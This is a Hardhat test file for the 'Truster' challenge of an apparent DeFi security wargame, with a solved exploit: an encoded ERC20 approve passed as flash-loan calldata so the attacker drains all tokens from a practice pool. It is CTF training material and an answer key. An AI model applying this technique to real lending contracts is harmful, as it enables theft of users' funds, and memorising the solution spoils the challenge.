const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
        /* Desctiption goal is take token all from the pool
        The vulnerable flashloan function accept too much args like "data" and then call this data
        function flashLoan(uint256 borrowAmount,address borrower,address target,bytes calldata data)

        we can encode function "approve" and sent to function as "data" payload.
        So, what we can do here is instead of trying to steal the tokens, we can approve our address 
        for the total balance of the DVT contract and circle back after our approval is successfully made
        and transfer all of the DVT tokens to myself.
        refer https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol
        function approve(address spender, uint256 amount) external returns (bool);
        In this case, when spender is attacker.address and address target is attacker
        It will be attack call function approve to check that his address is approver and return true

        new ethers.utils.Interface( abi )source
        Create a new Interface from a JSON string or object representing abi.

        interface.encodeFunctionData( fragment [ , values ] ) ⇒ string< DataHexString >
        Returns the encoded data, which can be used as the data for a transaction. refer 
        https://docs.ethers.io/v5/api/utils/abi/interface/
        */
        console.log("Before exploit");
        //balanceOf(address _owner) - how many tokens does the supplied address own
        let poolBalance = await this.token.balanceOf(this.pool.address);
        console.log("Pool balance :" + ethers.utils.formatEther(poolBalance.toString()));  // 1,000,000 ETH
        let attackerBalance = await this.token.balanceOf(attacker.address);
        console.log("Attacker balance :" + ethers.utils.formatEther(attackerBalance.toString()));   // 0 ETH
        
        const ABI = ["function approve(address, uint256)"];
        const interface = new ethers.utils.Interface(ABI);
        const payload = interface.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL.toString()]);
        //approved allowance from the pool to the attacker.
        await this.pool.connect(attacker).flashLoan(0, attacker.address, this.token.address, payload); 
        //circle back the process by transferFrom all token to attacker 
        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
        console.log("----------------------------------------------");
        console.log("After exploit");
        poolBalance = await this.token.balanceOf(this.pool.address);
        console.log("Pool balance :" + ethers.utils.formatEther(poolBalance.toString()));  // 0 ETH
        attackerBalance = await this.token.balanceOf(attacker.address);
        console.log("Attacker balance :" + ethers.utils.formatEther(attackerBalance.toString()));  // 1,000,000 ETH
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

